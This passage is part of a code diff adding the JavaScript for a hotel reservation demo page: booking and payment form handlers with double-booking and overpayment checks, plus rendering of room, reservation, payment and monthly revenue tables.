+        showNotice('error', `Room #${room_number} is already booked from ${conflict.check_in_date} to ${conflict.check_out_date} by ${conflict.guest_name}.`);
+        logTerminal('shield', `Double Booking Conflict intercepted for Room #${room_number}.`);
+        return;
+      }
+      if (isNaN(total_cost) || total_cost <= 0) {
+        showNotice('error', 'Total reservation price must be a positive number.');
+        return;
+      }
+
+      db.reservations.push({
+        reservation_id,
+        guest_name,
+        room_number,
+        check_in_date,
+        check_out_date,
+        total_cost
+      });
+      saveDB(db);
+      e.target.reset();
+      logTerminal('rectify', `Reservation #${reservation_id} booked for ${guest_name} in Room #${room_number}.`);
+      showNotice('success', `Reservation #${reservation_id} confirmed.`);
+      render();
+    });
+
+    document.getElementById('payForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const f = new FormData(e.target);
+      const payment_id = parseInt(f.get('payment_id'), 10);
+      const reservation_id = parseInt(f.get('reservation_id'), 10);
+      const payment_date = f.get('payment_date');
+      const payment_amount = parseFloat(f.get('payment_amount'));
+      const payment_method = sanitizeHTML(f.get('payment_method'));
+
+      const db = loadDB();
+
+      // Check unique payment ID
+      if (db.payments.some(p => p.payment_id === payment_id)) {
+        showNotice('error', `Payment ID #${payment_id} already exists.`);
+        return;
+      }
+      // Foreign Key check
+      const reservation = db.reservations.find(r => r.reservation_id === reservation_id);
+      if (!reservation) {
+        showNotice('error', `Foreign Key Error: Reservation #${reservation_id} does not exist.`);
+        return;
+      }
+      if (isNaN(payment_amount) || payment_amount <= 0) {
+        showNotice('error', 'Payment amount must be greater than $0.00.');
+        return;
+      }
+
+      // Check overpayment
+      const existingPaid = db.payments
+        .filter(p => p.reservation_id === reservation_id)
+        .reduce((sum, p) => sum + Number(p.payment_amount), 0);
+      const remainingBalance = reservation.total_cost - existingPaid;
+
+      if (payment_amount > (remainingBalance + 0.01)) {
+        showNotice('error', `Overpayment Rejected! Remaining balance is only $${remainingBalance.toFixed(2)}.`);
+        logTerminal('shield', `Attempted overpayment of $${payment_amount.toFixed(2)} on balance $${remainingBalance.toFixed(2)}.`);
+        return;
+      }
+
+      db.payments.push({
+        payment_id,
+        reservation_id,
+        payment_date,
+        payment_amount,
+        payment_method
+      });
+      saveDB(db);
+      e.target.reset();
+      logTerminal('rectify', `Settled payment #${payment_id} of $${payment_amount.toFixed(2)} via ${payment_method}.`);
+      showNotice('success', `Payment #${payment_id} registered successfully.`);
+      render();
+    });
+
+    function renderTableHTML(title, badge, rows) {
+      if (!rows.length) {
+        return `
+          <div class="table-container">
+            <div class="table-header-row">
+              <h2>${title}</h2>
+              <span class="table-badge ${badge === 'VIEW' ? 'view' : ''}">${badge} (0 records)</span>
+            </div>
+            <div class="empty-msg">No active records in this entity.</div>
+          </div>
+        `;
+      }
+      const cols = Object.keys(rows[0]);
+      const thead = cols.map(c => `<th>${c.replace(/_/g, ' ')}</th>`).join('');
+      const tbody = rows.map(r => {
+        return `<tr>${cols.map(c => {
+          const val = r[c];
+          const isNum = (c.includes('cost') || c.includes('rate') || c.includes('amount') || c.includes('revenue'));
+          if (isNum && !isNaN(val)) {
+            return `<td class="amount-cell">$${Number(val).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</td>`;
+          }
+          return `<td>${val ?? ''}</td>`;
+        }).join('')}</tr>`;
+      }).join('');
+
+      return `
+        <div class="table-container">
+          <div class="table-header-row">
+            <h2>${title}</h2>
+            <span class="table-badge ${badge === 'VIEW' ? 'view' : ''}">${badge} &bull; ${rows.length} RECORD(S)</span>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead><tr>${thead}</tr></thead>
+              <tbody>${tbody}</tbody>
+            </table>
+          </div>
+        </div>
+      `;
+    }
+
+    function render() {
+      const db = loadDB();
+      const totalRevenue = db.payments.reduce((sum, p) => sum + Number(p.payment_amount || 0), 0);
+
+      // Populate Selects
+      const roomSelect = document.getElementById('roomSelect');
+      roomSelect.innerHTML = db.rooms.map(r => `<option value="${r.room_number}">Room #${r.room_number} - ${r.room_type} ($${Number(r.room_rate).toFixed(2)}/nt)</option>`).join('');
+
+      const resSelect = document.getElementById('resSelect');
+      resSelect.innerHTML = db.reservations.map(r => {
+        const paid = db.payments.filter(p => p.reservation_id === r.reservation_id).reduce((s, p) => s + Number(p.payment_amount), 0);
+        const rem = Math.max(0, r.total_cost - paid);
+        return `<option value="${r.reservation_id}">Res #${r.reservation_id} (${r.guest_name}) - Bal: $${rem.toFixed(2)}</option>`;
+      }).join('');
+
+      // Generate View: Monthly Revenue
+      const monthlyMap = {};
+      db.payments.forEach(p => {
+        const m = (p.payment_date || '').slice(0, 7);
+        if (m) monthlyMap[m] = (monthlyMap[m] || 0) + Number(p.payment_amount || 0);
+      });
+      const monthlyRevenue = Object.entries(monthlyMap).map(([month, total_revenue]) => ({
+        month,
+        total_revenue: total_revenue.toFixed(2)
+      }));
+
+      // Render KPIs
+      document.getElementById('kpiGrid').innerHTML = `
+        <div class="kpi-card">
+          <div class="kpi-label">Active Rooms</div>
+          <div class="kpi-val kpi-gold">${db.rooms.length}</div>
+          <div class="kpi-hint">Configured in schema</div>
+        </div>
+        <div class="kpi-card">
+          <div class="kpi-label">Verified Bookings</div>
+          <div class="kpi-val kpi-violet">${db.reservations.length}</div>
+          <div class="kpi-hint">Zero double bookings</div>
+        </div>
+        <div class="kpi-card">
+          <div class="kpi-label">Processed Payments</div>
+          <div class="kpi-val kpi-gold">${db.payments.length}</div>
+          <div class="kpi-hint">Referential integrity intact</div>
+        </div>
+        <div class="kpi-card">
+          <div class="kpi-label">Total Realized Revenue</div>
+          <div class="kpi-val">$${totalRevenue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+          <div class="kpi-hint">Monthly view synchronized</div>
+        </div>
+      `;
+
+      // Render Tables
+      document.getElementById('tablesContainer').innerHTML =
+        renderTableHTML('Rooms Registry', 'TABLE: rooms', db.rooms) +
+        renderTableHTML('Reservations Ledger', 'TABLE: reservations', db.reservations) +
+        renderTableHTML('Payments Ledger', 'TABLE: payments', db.payments) +
+        renderTableHTML('Monthly Revenue Projection', 'VIEW: monthly_revenue', monthlyRevenue);
+    }
+
+    render();
+  </script>
+</body>
+</html>
